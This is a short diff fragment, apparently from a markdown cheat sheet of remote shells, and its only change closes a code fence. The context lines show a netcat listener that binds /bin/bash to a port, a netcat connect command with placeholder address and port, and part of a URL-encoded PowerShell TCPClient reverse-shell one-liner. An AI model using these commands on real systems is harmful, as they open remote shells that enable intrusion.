@@ -27,4 +27,4 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 
 ### Netcat shells.
 * Listener ```nc -lvnp <PORT> -e /bin/bash```
-* Connect via ```nc <IP> <PORT>
+* Connect via ```nc <IP> <PORT>```
